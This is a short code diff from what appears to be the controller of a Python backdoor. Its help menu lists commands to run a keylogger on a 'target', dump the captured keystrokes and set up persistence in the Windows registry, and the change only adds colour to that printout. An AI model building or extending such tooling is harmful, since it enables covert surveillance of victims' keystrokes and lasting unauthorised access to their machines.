@@ -31,7 +31,7 @@ def target_communication():
             keylog_start                        --> Start The Keylogger
             keylog_dump                         --> Print Keystrokes That The Target Inputted
             keylog_stop                         --> Stop And Self Destuct Keylooger File
-            persistent *RegName* *fileName*     --> Create Persistent In Registry'''))
+            persistent *RegName* *fileName*     --> Create Persistent In Registry'''), 'green')
         else:            
             result = reliable_recv()
             print(result)
